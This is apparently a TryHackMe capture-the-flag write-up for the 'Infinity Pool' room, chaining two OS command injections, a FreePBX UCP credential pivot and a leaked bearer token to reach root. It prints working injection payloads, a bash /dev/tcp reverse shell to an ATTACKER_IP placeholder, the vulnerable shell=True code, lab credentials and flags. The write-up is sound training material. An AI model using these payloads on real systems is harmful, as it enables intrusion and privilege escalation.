# TryHackMe — Hacker Holidays: The Byte Lotus Hotel

## Room: Infinity Pool

**Category:** Boot2Root / Web Exploitation **Difficulty:** Medium **Points:** 90 **Target:** `10.49.176.39`

---

### Challenge Brief

> No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.

The Byte Lotus Hotel's public site hints at an internal staff "connectivity tool" that talks to sister properties. What starts as a simple SSRF-looking form turns into unauthenticated OS command injection, internal service discovery, a FreePBX/UCP credential pivot, and a second command injection into a root-owned automation service.

---

## 1. Reconnaissance

Basic enumeration of the web root and static assets:

```bash
curl http://10.49.176.39/
curl http://10.49.176.39/static/app.js
```

A developer comment inside `app.js` leaked an undocumented internal route:

```js
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
```

Confirmed via `robots.txt`:

```
User-agent: *
Disallow: /internal/
Disallow: /status
```

`/status` rendered a simple staff tool: a form posting a `host` field to `/internal/netcheck`, described as a way to "confirm a remote property responds before routing a guest transfer."

---

## 2. Unauthenticated OS Command Injection

Testing the `host` parameter with a normal value first confirmed the backend was actually shelling out to `ping`:

```bash
curl -X POST http://10.49.176.39/internal/netcheck -d "host=127.0.0.1"
```

Response included real ICMP output — the server was executing `ping -c 1 <host>` via `subprocess.run(..., shell=True)` with **no sanitization**:

```python
proc = subprocess.run(
    f"ping -c 1 {host}",
    shell=True,
    capture_output=True,
    text=True,
    timeout=15,
)
```

This is a textbook shell injection sink. Confirmed with:

```bash
curl -X POST http://10.49.176.39/internal/netcheck -d "host=127.0.0.1;whoami"
```

Output included `web` — full command execution confirmed as the `web` user, unauthenticated.

### Getting a shell

`curl -d` does **not** URL-encode raw `&` characters, which broke bash job-control syntax (`>&`, `0>&1`) mid-payload. Fixed by switching to `--data-urlencode`:

```bash
curl -X POST http://10.49.176.39/internal/netcheck \
  --data-urlencode "host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
```

With a listener running (`nc -lvnp 4444`), a reverse shell landed as `web`. Upgraded to a full PTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 3. User Flag

```bash
cat /home/web/user.txt
```

**User flag:** `THM{n0_v1s1bl3_3dg3}`

---

## 4. Internal Enumeration — "Three Systems Nobody Told You About"

`ps aux` revealed the same `gunicorn` stack running as **three different users**, exactly matching the room's framing:

|Port|Service|Running As|Purpose|
|---|---|---|---|
|80|`edge`|`web`|public-facing app (already popped)|
|9000|`automation`|**root**|internal automation/export API|
|3000|`watchtower`|`svc-watch`|internal ops/config console|
|8080|Apache / FreePBX|`asterisk`|UCP + admin panel|
|8088|Asterisk HTTP|`asterisk`|PBX interface|
|5038|Asterisk Manager (AMI)|—|banner-only, not exploited in this path|

`automation` and `watchtower` source directories were `750`-locked and unreadable as `web`, but both exposed loopback-only HTTP APIs.

### Automation service (root, port 9000)

```bash
curl -sS http://127.0.0.1:9000/health
```

```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {"report": "<report name>"},
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

Locked behind a Bearer token — the real prize, since it runs as root.

### Watchtower service (svc-watch, port 3000)

```bash
curl -sS http://127.0.0.1:3000/api/config
```

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

Leaked credentials for the FreePBX **UCP** (User Control Panel) — an ops note admits they were never rotated.

---

## 5. FreePBX UCP Pivot

`http://127.0.0.1:8080/` was a FreePBX 16.0.45 instance. `/admin/` (the full admin panel) rejected the leaked creds — they were scoped to UCP only.

### Reverse-engineering the login flow

UCP's login form doesn't POST directly; it's driven by an AJAX call defined in `ucp.js`:

```js
queryString = queryString + "&module=User&command=login";
$.post(UCP.ajaxUrl, queryString, function (data) { ... });
```

Backend handler (`User.class.php`) confirmed the exact contract — a session `token` (anti-CSRF, scraped from the login page), `username`, `password`, plus `module=User&command=login`, posted to `ajax.php`:

```bash
# Grab session cookie + CSRF token
curl -sc cookies.txt http://127.0.0.1:8080/ucp/ -o login.html
TOKEN=$(grep -oP 'name="token" value="\K[^"]+' login.html)

# Correct login request
curl -sb cookies.txt -c cookies.txt \
  --data-urlencode "token=${TOKEN}" \
  --data-urlencode "username=FreePBXUCPTemplateCreator" \
  --data-urlencode "password=St4yN0t1c3d_2026" \
  --data-urlencode "module=User" \
  --data-urlencode "command=login" \
  "http://127.0.0.1:8080/ucp/ajax.php"
```

```json
{"status":true,"message":"","token":"91f1d76fcf5e46f8c97a153c9dde17ee"}
```

Authenticated. Dashboard confirmed: `"Welcome FreePBXUCPTemplateCreator"`.

### Finding the automation Bearer token

Inside the authenticated UCP session, adding the **Voicemail** dashboard widget for the associated extension surfaced the automation service's Bearer key, hidden in the widget content:

```
cc_auto_7b3f9a1c4e0d2f6a
```

---

## 6. Root via Second Command Injection

With `GET /health` already hinting the export job builds a shell command from user input (`tar czf ... /var/automation/exports/<report>.tgz ...`), the `report` field was tested for injection:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test;id;#"}'
```

```json
{"command":"tar czf /var/automation/exports/test;id;#.tgz /var/automation/data 2>&1",
 "output":"uid=0(root) gid=0(root) groups=0(root)\ntar: Cowardly refusing to create an empty archive..."}
```

`uid=0(root)` confirmed — the exact same command-injection pattern as the edge app, this time running with root privileges.

### Root flag

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"x;cat /root/root.txt;#"}'
```

```json
{"output":"THM{tr4c3d_t0_th3_h0r1z0n}\ntar: Cowardly refusing to create an empty archive..."}
```

**Root flag:** `THM{tr4c3d_t0_th3_h0r1z0n}`

---

## Attack Chain Summary

```
Public site (app.js comment leak)
        │
        ▼
/internal/netcheck — unauthenticated OS command injection
        │
        ▼
Reverse shell as `web`  →  user.txt
        │
        ▼
ps aux enumeration → 3 hidden internal services
        │
        ├── watchtower (svc-watch, :3000) → leaks UCP creds via /api/config
        │
        ▼
FreePBX UCP login (reverse-engineered ajax.php contract)
        │
        ▼
Voicemail widget leaks automation Bearer token
        │
        ▼
automation service (root, :9000) — 2nd command injection via `report` field
        │
        ▼
root.txt as root
```

## Key Takeaways

- **Two separate command-injection bugs** in the same box, both from unsanitized string interpolation into `shell=True` subprocess calls — one public-facing (`ping`), one internal (`tar`).
- **Credential sprawl between microservices**: the watchtower "ops console" leaked plaintext FreePBX creds meant for internal use only — a classic case of an internal API becoming the weakest link.
- **Hardcoded/template credentials never rotated** (`FreePBXUCPTemplateCreator`) — the ops note in the leaked config literally flagged this as a known, unresolved risk.
- **Undocumented AJAX contracts**: FreePBX/UCP's login doesn't behave like a standard HTML form POST; reading `ucp.js` and the backend `User.class.php` handler was necessary to construct a valid authenticated request from the CLI.
- **Sensitive secrets stored in unexpected UI locations** (a voicemail widget) — a reminder that secrets can leak through _any_ rendered surface, not just config files or environment variables.

---

_Obito Uchiha — Team AKATSUKI_